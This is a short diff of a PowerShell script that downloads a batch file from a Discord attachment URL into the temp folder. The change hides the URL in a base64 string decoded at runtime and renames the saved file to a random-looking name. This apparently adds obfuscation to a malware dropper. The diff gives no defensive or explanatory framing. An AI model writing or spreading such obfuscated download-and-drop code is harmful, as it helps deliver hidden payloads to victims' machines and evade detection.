@@ -1,6 +1,7 @@
-$Url = "https://cdn.discordapp.com/attachments/1149054015036981269/1150475396064759928/test.bat"
+$ffff = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0OTA1NDAxNTAzNjk4MTI2OS8xMTUwNDE3NjAyMjUwODEzNjAxL1VuaS5iYXQ="
+$Url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ffff))
 
-$OutputPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "d.bat")
+$OutputPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "djdyakht.bat")
 
 Invoke-WebRequest -Uri $Url -OutFile $OutputPath
 
